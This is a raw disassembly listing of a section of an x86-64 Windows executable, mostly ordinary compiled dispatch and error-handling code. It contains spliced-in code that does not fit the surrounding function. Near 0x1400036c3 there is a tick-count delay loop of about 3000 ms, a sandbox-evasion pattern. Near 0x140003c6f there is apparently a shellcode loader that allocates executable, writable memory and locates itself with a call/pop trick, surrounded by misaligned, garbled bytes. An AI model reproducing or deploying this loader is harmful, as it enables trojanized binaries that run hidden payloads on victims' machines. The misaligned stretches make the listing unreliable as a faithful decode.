   14000357b:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003580:	0f 87 a9 02 00 00    	ja     0x14000382f
   140003586:	44 8b 49 0c          	mov    0xc(%rcx),%r9d
   14000358a:	41 8b db             	mov    %r11d,%ebx
   14000358d:	89 5d e0             	mov    %ebx,-0x20(%rbp)
   140003590:	44 89 5d e4          	mov    %r11d,-0x1c(%rbp)
   140003594:	44 89 4d e8          	mov    %r9d,-0x18(%rbp)
   140003598:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   14000359c:	8b 41 08             	mov    0x8(%rcx),%eax
   14000359f:	3d 41 9c 00 00       	cmp    $0x9c41,%eax
   1400035a4:	0f 87 7f 01 00 00    	ja     0x140003729
   1400035aa:	0f 84 19 01 00 00    	je     0x1400036c9
   1400035b0:	2d 20 4e 00 00       	sub    $0x4e20,%eax
   1400035b5:	0f 84 a8 00 00 00    	je     0x140003663
   1400035bb:	83 e8 01             	sub    $0x1,%eax
   1400035be:	74 40                	je     0x140003600
   1400035c0:	83 e8 01             	sub    $0x1,%eax
   1400035c3:	74 23                	je     0x1400035e8
   1400035c5:	3d 1e 4e 00 00       	cmp    $0x4e1e,%eax
   1400035ca:	0f 85 74 01 00 00    	jne    0x140003744
   1400035d0:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   1400035d4:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400035d8:	e8 03 6f 00 00       	call   0x14000a4e0
   1400035dd:	44 8b d8             	mov    %eax,%r11d
   1400035e0:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   1400035e3:	e9 1d 01 00 00       	jmp    0x140003705
   1400035e8:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   1400035ec:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400035f0:	e8 1b 6b 00 00       	call   0x14000a110
   1400035f5:	44 8b d8             	mov    %eax,%r11d
   1400035f8:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   1400035fb:	e9 05 01 00 00       	jmp    0x140003705
   140003600:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140003604:	48 8b 51 38          	mov    0x38(%rcx),%rdx
   140003608:	48 85 d2             	test   %rdx,%rdx
   14000360b:	74 36                	je     0x140003643
   14000360d:	8b 42 0c             	mov    0xc(%rdx),%eax
   140003610:	ff c8                	dec    %eax
   140003612:	81 7a 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rdx)
   140003619:	75 28                	jne    0x140003643
   14000361b:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003620:	77 21                	ja     0x140003643
   140003622:	38 59 48             	cmp    %bl,0x48(%rcx)
   140003625:	74 0a                	je     0x140003631
   140003627:	bb 10 00 00 00       	mov    $0x10,%ebx
   14000362c:	e9 d4 00 00 00       	jmp    0x140003705
   140003631:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140003635:	48 89 42 48          	mov    %rax,0x48(%rdx)
   140003639:	bb 50 00 00 00       	mov    $0x50,%ebx
   14000363e:	e9 c2 00 00 00       	jmp    0x140003705
   140003643:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%rbp)
   14000364a:	4c 8d 05 bf b2 12 00 	lea    0x12b2bf(%rip),%r8        # 0x14012e910
   140003651:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003655:	e8 b6 b9 00 00       	call   0x14000f010
   14000365a:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   14000365e:	e9 a2 00 00 00       	jmp    0x140003705
   140003663:	4c 8d 41 38          	lea    0x38(%rcx),%r8
   140003667:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   14000366b:	49 8b 08             	mov    (%r8),%rcx
   14000366e:	48 85 c9             	test   %rcx,%rcx
   140003671:	74 39                	je     0x1400036ac
   140003673:	8b 41 0c             	mov    0xc(%rcx),%eax
   140003676:	ff c8                	dec    %eax
   140003678:	81 79 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rcx)
   14000367f:	75 2b                	jne    0x1400036ac
   140003681:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003686:	77 24                	ja     0x1400036ac
   140003688:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000368c:	41 38 58 30          	cmp    %bl,0x30(%r8)
   140003690:	74 0d                	je     0x14000369f
   140003692:	e8 48 83 ec 38       	call   0x178ecb9df
   140003697:	e8 27 00 00 00       	call   0x1400036c3
   14000369c:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400036a0:	e8 1e 00 00 00       	call   0x1400036c3
   1400036a5:	2b 44 24 20          	sub    0x20(%rsp),%eax
   1400036a9:	3d b8 0b 00 00       	cmp    $0xbb8,%eax
   1400036ae:	73 02                	jae    0x1400036b2
   1400036b0:	eb ee                	jmp    0x1400036a0
   1400036b2:	48 83 c4 38          	add    $0x38,%rsp
   1400036b6:	c3                   	ret
   1400036b7:	cc                   	int3
   1400036b8:	cc                   	int3
   1400036b9:	cc                   	int3
   1400036ba:	cc                   	int3
   1400036bb:	cc                   	int3
   1400036bc:	cc                   	int3
   1400036bd:	cc                   	int3
   1400036be:	cc                   	int3
   1400036bf:	cc                   	int3
   1400036c0:	cc                   	int3
   1400036c1:	cc                   	int3
   1400036c2:	cc                   	int3
   1400036c3:	48 83 ec 28          	sub    $0x28,%rsp
   1400036c7:	48 c7 44 24 08 04 00 	movq   $0x7ffe0004,0x8(%rsp)
   1400036ce:	fe 7f 
   1400036d0:	48 c7 44 24 10 24 03 	movq   $0x7ffe0324,0x10(%rsp)
   1400036d7:	fe 7f 
   1400036d9:	48 c7 44 24 18 20 03 	movq   $0x7ffe0320,0x18(%rsp)
   1400036e0:	fe 7f 
   1400036e2:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
   1400036e7:	8b 00                	mov    (%rax),%eax
   1400036e9:	c1 e0 08             	shl    $0x8,%eax
   1400036ec:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400036f1:	8b 09                	mov    (%rcx),%ecx
   1400036f3:	0f af c8             	imul   %eax,%ecx
   1400036f6:	8b c1                	mov    %ecx,%eax
   1400036f8:	8b c0                	mov    %eax,%eax
   1400036fa:	48 8b 4c 24 18       	mov    0x18(%rsp),%rcx
   1400036ff:	8b 09                	mov    (%rcx),%ecx
   140003701:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
   140003706:	8b 12                	mov    (%rdx),%edx
   140003708:	48 0f af ca          	imul   %rdx,%rcx
   14000370c:	48 c1 e9 18          	shr    $0x18,%rcx
   140003710:	48 03 c1             	add    %rcx,%rax
   140003713:	89 04 24             	mov    %eax,(%rsp)
   140003716:	8b 04 24             	mov    (%rsp),%eax
   140003719:	48 83 c4 28          	add    $0x28,%rsp
   14000371d:	c3                   	ret
   14000371e:	00 00                	add    %al,(%rax)
   140003720:	00 48 83             	add    %cl,-0x7d(%rax)
   140003723:	c4                   	(bad)
   140003724:	50                   	push   %rax
   140003725:	5f                   	pop    %rdi
   140003726:	5e                   	pop    %rsi
   140003727:	5d                   	pop    %rbp
   140003728:	c3                   	ret
   140003729:	2d 42 9c 00 00       	sub    $0x9c42,%eax
   14000372e:	0f 84 db 00 00 00    	je     0x14000380f
   140003734:	2d 0e 27 00 00       	sub    $0x270e,%eax
   140003739:	0f 84 b0 00 00 00    	je     0x1400037ef
   14000373f:	83 f8 01             	cmp    $0x1,%eax
   140003742:	74 19                	je     0x14000375d
   140003744:	41 bb 05 00 00 00    	mov    $0x5,%r11d
   14000374a:	41 8b c3             	mov    %r11d,%eax
   14000374d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003754:	00 
   140003755:	48 83 c4 50          	add    $0x50,%rsp
   140003759:	5f                   	pop    %rdi
   14000375a:	5e                   	pop    %rsi
   14000375b:	5d                   	pop    %rbp
   14000375c:	c3                   	ret
   14000375d:	48 8d 79 38          	lea    0x38(%rcx),%rdi
   140003761:	4c 8b c7             	mov    %rdi,%r8
   140003764:	41 8b d1             	mov    %r9d,%edx
   140003767:	e8 04 ab 00 00       	call   0x14000e270
   14000376c:	85 c0                	test   %eax,%eax
   14000376e:	0f 84 a0 00 00 00    	je     0x140003814
   140003774:	0f b6 57 03          	movzbl 0x3(%rdi),%edx
   140003778:	44 0f b6 47 04       	movzbl 0x4(%rdi),%r8d
   14000377d:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140003782:	80 3f 01             	cmpb   $0x1,(%rdi)
   140003785:	75 2a                	jne    0x1400037b1
   140003787:	41 80 f8 01          	cmp    $0x1,%r8b
   14000378b:	0f 85 83 00 00 00    	jne    0x140003814
   140003791:	bb 24 00 00 00       	mov    $0x24,%ebx
   140003796:	89 1e                	mov    %ebx,(%rsi)
   140003798:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000379b:	89 46 04             	mov    %eax,0x4(%rsi)
   14000379e:	41 8b c3             	mov    %r11d,%eax
   1400037a1:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400037a8:	00 
   1400037a9:	48 83 c4 50          	add    $0x50,%rsp
   1400037ad:	5f                   	pop    %rdi
   1400037ae:	5e                   	pop    %rsi
   1400037af:	5d                   	pop    %rbp
   1400037b0:	c3                   	ret
   1400037b1:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400037b6:	80 fa 01             	cmp    $0x1,%dl
   1400037b9:	b8 24 00 00 00       	mov    $0x24,%eax
   1400037be:	0f 45 c3             	cmovne %ebx,%eax
   1400037c1:	8b d8                	mov    %eax,%ebx
   1400037c3:	41 80 f8 01          	cmp    $0x1,%r8b
   1400037c7:	75 4b                	jne    0x140003814
   1400037c9:	bb 30 00 00 00       	mov    $0x30,%ebx
   1400037ce:	41 3a d0             	cmp    %r8b,%dl
   1400037d1:	0f 45 d9             	cmovne %ecx,%ebx
   1400037d4:	89 1e                	mov    %ebx,(%rsi)
   1400037d6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   1400037d9:	89 46 04             	mov    %eax,0x4(%rsi)
   1400037dc:	41 8b c3             	mov    %r11d,%eax
   1400037df:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400037e6:	00 
   1400037e7:	48 83 c4 50          	add    $0x50,%rsp
   1400037eb:	5f                   	pop    %rdi
   1400037ec:	5e                   	pop    %rsi
   1400037ed:	5d                   	pop    %rbp
   1400037ee:	c3                   	ret
   1400037ef:	bb 0c 00 00 00       	mov    $0xc,%ebx
   1400037f4:	89 1e                	mov    %ebx,(%rsi)
   1400037f6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   1400037f9:	89 46 04             	mov    %eax,0x4(%rsi)
   1400037fc:	41 8b c3             	mov    %r11d,%eax
   1400037ff:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003806:	00 
   140003807:	48 83 c4 50          	add    $0x50,%rsp
   14000380b:	5f                   	pop    %rdi
   14000380c:	5e                   	pop    %rsi
   14000380d:	5d                   	pop    %rbp
   14000380e:	c3                   	ret
   14000380f:	bb 18 00 00 00       	mov    $0x18,%ebx
   140003814:	89 1e                	mov    %ebx,(%rsi)
   140003816:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140003819:	89 46 04             	mov    %eax,0x4(%rsi)
   14000381c:	41 8b c3             	mov    %r11d,%eax
   14000381f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003826:	00 
   140003827:	48 83 c4 50          	add    $0x50,%rsp
   14000382b:	5f                   	pop    %rdi
   14000382c:	5e                   	pop    %rsi
   14000382d:	5d                   	pop    %rbp
   14000382e:	c3                   	ret
   14000382f:	e8 3c 67 00 00       	call   0x140009f70
   140003834:	b8 01 00 00 00       	mov    $0x1,%eax
   140003839:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003840:	00 
   140003841:	48 83 c4 50          	add    $0x50,%rsp
   140003845:	5f                   	pop    %rdi
   140003846:	5e                   	pop    %rsi
   140003847:	5d                   	pop    %rbp
   140003848:	c3                   	ret
   140003849:	cc                   	int3
   14000384a:	cc                   	int3
   14000384b:	cc                   	int3
   14000384c:	cc                   	int3
   14000384d:	cc                   	int3
   14000384e:	cc                   	int3
   14000384f:	cc                   	int3
   140003850:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003855:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000385a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000385f:	55                   	push   %rbp
   140003860:	48 8b ec             	mov    %rsp,%rbp
   140003863:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000386a:	48 8b 05 cf f7 13 00 	mov    0x13f7cf(%rip),%rax        # 0x140143040
   140003871:	48 33 c4             	xor    %rsp,%rax
   140003874:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003878:	33 ff                	xor    %edi,%edi
   14000387a:	8b df                	mov    %edi,%ebx
   14000387c:	48 85 c9             	test   %rcx,%rcx
   14000387f:	0f 94 c3             	sete   %bl
   140003882:	48 85 c9             	test   %rcx,%rcx
   140003885:	75 11                	jne    0x140003898
   140003887:	48 8d 15 2a af 12 00 	lea    0x12af2a(%rip),%rdx        # 0x14012e7b8
   14000388e:	e8 3d 66 00 00       	call   0x140009ed0
   140003893:	e9 3b 04 00 00       	jmp    0x140003cd3
   140003898:	48 8b 31             	mov    (%rcx),%rsi
   14000389b:	48 85 f6             	test   %rsi,%rsi
   14000389e:	0f 84 25 04 00 00    	je     0x140003cc9
   1400038a4:	8b 46 0c             	mov    0xc(%rsi),%eax
   1400038a7:	ff c8                	dec    %eax
   1400038a9:	81 7e 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rsi)
   1400038b0:	0f 85 13 04 00 00    	jne    0x140003cc9
   1400038b6:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   1400038bb:	0f 87 08 04 00 00    	ja     0x140003cc9
   1400038c1:	8b 51 0c             	mov    0xc(%rcx),%edx
   1400038c4:	44 8b 41 30          	mov    0x30(%rcx),%r8d
   1400038c8:	4c 8b 49 28          	mov    0x28(%rcx),%r9
   1400038cc:	4c 89 4d b0          	mov    %r9,-0x50(%rbp)
   1400038d0:	44 89 45 b8          	mov    %r8d,-0x48(%rbp)
   1400038d4:	48 89 7d bc          	mov    %rdi,-0x44(%rbp)
   1400038d8:	89 55 c4             	mov    %edx,-0x3c(%rbp)
   1400038db:	4c 8d 51 10          	lea    0x10(%rcx),%r10
   1400038df:	4c 89 55 c8          	mov    %r10,-0x38(%rbp)
   1400038e3:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
   1400038e7:	8b 41 08             	mov    0x8(%rcx),%eax
   1400038ea:	3d 41 9c 00 00       	cmp    $0x9c41,%eax
   1400038ef:	0f 87 3f 02 00 00    	ja     0x140003b34
   1400038f5:	0f 84 d0 01 00 00    	je     0x140003acb
   1400038fb:	2d 20 4e 00 00       	sub    $0x4e20,%eax
   140003900:	0f 84 49 01 00 00    	je     0x140003a4f
   140003906:	83 e8 01             	sub    $0x1,%eax
   140003909:	74 4d                	je     0x140003958
   14000390b:	83 e8 01             	sub    $0x1,%eax
   14000390e:	74 34                	je     0x140003944
   140003910:	3d 1e 4e 00 00       	cmp    $0x4e1e,%eax
   140003915:	0f 85 30 02 00 00    	jne    0x140003b4b
   14000391b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000391f:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140003923:	40 38 79 40          	cmp    %dil,0x40(%rcx)
   140003927:	48 8b c8             	mov    %rax,%rcx
   14000392a:	74 0c                	je     0x140003938
   14000392c:	e8 af cb 00 00       	call   0x1400104e0
   140003931:	8b d8                	mov    %eax,%ebx
   140003933:	e9 9b 03 00 00       	jmp    0x140003cd3
   140003938:	e8 e3 cd 00 00       	call   0x140010720
   14000393d:	8b d8                	mov    %eax,%ebx
   14000393f:	e9 8f 03 00 00       	jmp    0x140003cd3
   140003944:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140003948:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000394c:	e8 2f 6f 00 00       	call   0x14000a880
   140003951:	8b d8                	mov    %eax,%ebx
   140003953:	e9 7b 03 00 00       	jmp    0x140003cd3
   140003958:	4c 8d 49 38          	lea    0x38(%rcx),%r9
   14000395c:	49 8b 19             	mov    (%r9),%rbx
   14000395f:	48 85 db             	test   %rbx,%rbx
   140003962:	74 76                	je     0x1400039da
   140003964:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003967:	ff c8                	dec    %eax
   140003969:	81 7b 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rbx)
   140003970:	75 68                	jne    0x1400039da
   140003972:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003977:	77 61                	ja     0x1400039da
   140003979:	85 d2                	test   %edx,%edx
   14000397b:	74 08                	je     0x140003985
   14000397d:	83 fa 01             	cmp    $0x1,%edx
   140003980:	75 03                	jne    0x140003985
   140003982:	8d 7a 2f             	lea    0x2f(%rdx),%edi
   140003985:	48 8b cb             	mov    %rbx,%rcx
   140003988:	41 80 79 10 00       	cmpb   $0x0,0x10(%r9)
   14000398d:	74 38                	je     0x1400039c7
   14000398f:	49 8b d2             	mov    %r10,%rdx
   140003992:	e8 19 32 01 00       	call   0x140016bb0
   140003997:	48 8b 43 20          	mov    0x20(%rbx),%rax
   14000399b:	0f b6 88 54 05 00 00 	movzbl 0x554(%rax),%ecx
   1400039a2:	f6 d9                	neg    %cl
   1400039a4:	45 1b c9             	sbb    %r9d,%r9d
   1400039a7:	41 83 e1 08          	and    $0x8,%r9d
   1400039ab:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   1400039af:	4c 03 c7             	add    %rdi,%r8
   1400039b2:	ba 58 23 00 00       	mov    $0x2358,%edx
   1400039b7:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400039bb:	e8 e0 5d 01 00       	call   0x1400197a0
   1400039c0:	8b d8                	mov    %eax,%ebx
   1400039c2:	e9 0c 03 00 00       	jmp    0x140003cd3
   1400039c7:	4c 8b c7             	mov    %rdi,%r8
   1400039ca:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   1400039ce:	e8 5d e4 00 00       	call   0x140011e30
   1400039d3:	8b d8                	mov    %eax,%ebx
   1400039d5:	e9 f9 02 00 00       	jmp    0x140003cd3
   1400039da:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400039df:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400039e2:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400039e6:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   1400039ea:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   1400039f1:	00 
   1400039f2:	48 8d 05 17 af 12 00 	lea    0x12af17(%rip),%rax        # 0x14012e910
   1400039f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400039fe:	4c 8b c6             	mov    %rsi,%r8
   140003a01:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003a05:	e8 76 b3 00 00       	call   0x14000ed80
   140003a0a:	90                   	nop
   140003a0b:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140003a0f:	48 83 fa 10          	cmp    $0x10,%rdx
   140003a13:	0f 82 ba 02 00 00    	jb     0x140003cd3
   140003a19:	48 ff c2             	inc    %rdx
   140003a1c:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140003a20:	48 8b c1             	mov    %rcx,%rax
   140003a23:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003a2a:	72 19                	jb     0x140003a45
   140003a2c:	48 83 c2 27          	add    $0x27,%rdx
   140003a30:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003a34:	48 2b c1             	sub    %rcx,%rax
   140003a37:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003a3b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003a3f:	0f 87 b5 02 00 00    	ja     0x140003cfa
   140003a45:	e8 46 a9 0b 00       	call   0x1400be390
   140003a4a:	e9 84 02 00 00       	jmp    0x140003cd3
   140003a4f:	4c 8d 41 38          	lea    0x38(%rcx),%r8
   140003a53:	49 8b 08             	mov    (%r8),%rcx
   140003a56:	48 85 c9             	test   %rcx,%rcx
   140003a59:	74 3a                	je     0x140003a95
   140003a5b:	8b 41 0c             	mov    0xc(%rcx),%eax
   140003a5e:	ff c8                	dec    %eax
   140003a60:	81 79 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rcx)
   140003a67:	75 2c                	jne    0x140003a95
   140003a69:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003a6e:	77 25                	ja     0x140003a95
   140003a70:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140003a74:	41 38 78 30          	cmp    %dil,0x30(%r8)
   140003a78:	74 0f                	je     0x140003a89
   140003a7a:	4d 8b ca             	mov    %r10,%r9
   140003a7d:	e8 de db 00 00       	call   0x140011660
   140003a82:	8b d8                	mov    %eax,%ebx
   140003a84:	e9 4a 02 00 00       	jmp    0x140003cd3
   140003a89:	e8 a2 df 00 00       	call   0x140011a30
   140003a8e:	8b d8                	mov    %eax,%ebx
   140003a90:	e9 3e 02 00 00       	jmp    0x140003cd3
   140003a95:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003a9a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003a9d:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140003aa1:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   140003aa5:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140003aac:	00 
   140003aad:	48 8d 05 84 ad 12 00 	lea    0x12ad84(%rip),%rax        # 0x14012e838
   140003ab4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003ab9:	4c 8b c6             	mov    %rsi,%r8
   140003abc:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003ac0:	e8 bb b2 00 00       	call   0x14000ed80
   140003ac5:	90                   	nop
   140003ac6:	e9 40 ff ff ff       	jmp    0x140003a0b
   140003acb:	0f b6 41 40          	movzbl 0x40(%rcx),%eax
   140003acf:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   140003ad3:	85 d2                	test   %edx,%edx
   140003ad5:	75 20                	jne    0x140003af7
   140003ad7:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003adb:	84 c0                	test   %al,%al
   140003add:	74 0c                	je     0x140003aeb
   140003adf:	e8 1c 61 01 00       	call   0x140019c00
   140003ae4:	8b d8                	mov    %eax,%ebx
   140003ae6:	e9 e8 01 00 00       	jmp    0x140003cd3
   140003aeb:	e8 b0 62 01 00       	call   0x140019da0
   140003af0:	8b d8                	mov    %eax,%ebx
   140003af2:	e9 dc 01 00 00       	jmp    0x140003cd3
   140003af7:	83 fa 01             	cmp    $0x1,%edx
   140003afa:	40 0f 95 c7          	setne  %dil
   140003afe:	89 7d d8             	mov    %edi,-0x28(%rbp)
   140003b01:	74 11                	je     0x140003b14
   140003b03:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003b07:	e8 f4 bc 00 00       	call   0x14000f800
   140003b0c:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   140003b0f:	e9 bf 01 00 00       	jmp    0x140003cd3
   140003b14:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003b18:	84 c0                	test   %al,%al
   140003b1a:	74 0c                	je     0x140003b28
   140003b1c:	e8 cf cf 00 00       	call   0x140010af0
   140003b21:	8b d8                	mov    %eax,%ebx
   140003b23:	e9 ab 01 00 00       	jmp    0x140003cd3
   140003b28:	e8 63 d1 00 00       	call   0x140010c90
   140003b2d:	8b d8                	mov    %eax,%ebx
   140003b2f:	e9 9f 01 00 00       	jmp    0x140003cd3
   140003b34:	2d 42 9c 00 00       	sub    $0x9c42,%eax
   140003b39:	0f 84 bf 00 00 00    	je     0x140003bfe
   140003b3f:	2d 0e 27 00 00       	sub    $0x270e,%eax
   140003b44:	74 6f                	je     0x140003bb5
   140003b46:	83 f8 01             	cmp    $0x1,%eax
   140003b49:	74 0a                	je     0x140003b55
   140003b4b:	bb 05 00 00 00       	mov    $0x5,%ebx
   140003b50:	e9 7e 01 00 00       	jmp    0x140003cd3
   140003b55:	4c 8d 59 38          	lea    0x38(%rcx),%r11
   140003b59:	8b df                	mov    %edi,%ebx
   140003b5b:	4d 8b c3             	mov    %r11,%r8
   140003b5e:	e8 0d a7 00 00       	call   0x14000e270
   140003b63:	85 c0                	test   %eax,%eax
   140003b65:	0f 84 68 01 00 00    	je     0x140003cd3
   140003b6b:	44 8b c0             	mov    %eax,%r8d
   140003b6e:	49 8b d3             	mov    %r11,%rdx
   140003b71:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003b75:	e8 36 d4 00 00       	call   0x140010fb0
   140003b7a:	8b d8                	mov    %eax,%ebx
   140003b7c:	85 c0                	test   %eax,%eax
   140003b7e:	0f 84 4f 01 00 00    	je     0x140003cd3
   140003b84:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003b87:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140003b8b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   140003b8f:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140003b96:	00 
   140003b97:	48 8d 05 32 ae 12 00 	lea    0x12ae32(%rip),%rax        # 0x14012e9d0
   140003b9e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003ba3:	4c 8b c6             	mov    %rsi,%r8
   140003ba6:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003baa:	e8 d1 b1 00 00       	call   0x14000ed80
   140003baf:	90                   	nop
   140003bb0:	e9 56 fe ff ff       	jmp    0x140003a0b
   140003bb5:	8b 51 38             	mov    0x38(%rcx),%edx
   140003bb8:	c1 ca 07             	ror    $0x7,%edx
   140003bbb:	45 33 c0             	xor    %r8d,%r8d
   140003bbe:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003bc2:	e8 69 d2 00 00       	call   0x140010e30
   140003bc7:	8b d8                	mov    %eax,%ebx
   140003bc9:	85 c0                	test   %eax,%eax
   140003bcb:	74 6b                	je     0x140003c38
   140003bcd:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003bd0:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140003bd4:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   140003bd8:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140003bdf:	00 
   140003be0:	48 8d 05 b1 ad 12 00 	lea    0x12adb1(%rip),%rax        # 0x14012e998
   140003be7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003bec:	4c 8b c6             	mov    %rsi,%r8
   140003bef:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003bf3:	e8 88 b1 00 00       	call   0x14000ed80
   140003bf8:	90                   	nop
   140003bf9:	e9 0d fe ff ff       	jmp    0x140003a0b
   140003bfe:	c7 45 d8 04 00 00 7a 	movl   $0x7a000004,-0x28(%rbp)
   140003c05:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   140003c09:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   140003c0d:	c7 45 dc 3f 1c 10 00 	movl   $0x101c3f,-0x24(%rbp)
   140003c14:	4d 85 c9             	test   %r9,%r9
   140003c17:	74 44                	je     0x140003c5d
   140003c19:	41 83 f8 18          	cmp    $0x18,%r8d
   140003c1d:	72 3e                	jb     0x140003c5d
   140003c1f:	49 83 f8 18          	cmp    $0x18,%r8
   140003c23:	72 1a                	jb     0x140003c3f
   140003c25:	0f 10 45 d8          	movups -0x28(%rbp),%xmm0
   140003c29:	41 0f 11 01          	movups %xmm0,(%r9)
   140003c2d:	f2 0f 10 4d e8       	movsd  -0x18(%rbp),%xmm1
   140003c32:	f2 41 0f 11 49 10    	movsd  %xmm1,0x10(%r9)
   140003c38:	8b df                	mov    %edi,%ebx
   140003c3a:	e9 94 00 00 00       	jmp    0x140003cd3
   140003c3f:	33 d2                	xor    %edx,%edx
   140003c41:	49 8b c9             	mov    %r9,%rcx
   140003c44:	e8 f7 da 0b 00       	call   0x1400c1740
   140003c49:	e8 be 12 0e 00       	call   0x1400e4f0c
   140003c4e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   140003c54:	e8 47 fa 0d 00       	call   0x1400e36a0
   140003c59:	8b df                	mov    %edi,%ebx
   140003c5b:	eb 76                	jmp    0x140003cd3
   140003c5d:	bb 06 00 00 00       	mov    $0x6,%ebx
   140003c62:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003c65:	0f 11 48 81          	movups %xmm1,-0x7f(%rax)
   140003c69:	ec                   	in     (%dx),%al
   140003c6a:	e8 00 00 00 48       	call   0x188003c6f
   140003c6f:	33 c9                	xor    %ecx,%ecx
   140003c71:	48 c7 c2 92 e6 04 00 	mov    $0x4e692,%rdx
   140003c78:	49 c7 c0 00 10 00 00 	mov    $0x1000,%r8
   140003c7f:	49 c7 c1 40 00 00 00 	mov    $0x40,%r9
   140003c86:	48 ff 15 0b c6 02 00 	rex.W call *0x2c60b(%rip)        # 0x140030298
   140003c8d:	48 85 c0             	test   %rax,%rax
   140003c90:	0f 84 43 01 00 00    	je     0x140003dd9
   140003c96:	48 8b f8             	mov    %rax,%rdi
   140003c99:	e8 00 00 00 00       	call   0x140003c9e
   140003c9e:	5e                   	pop    %rsi
   140003c9f:	48 81 c6 57 72 04 00 	add    $0x47257,%rsi
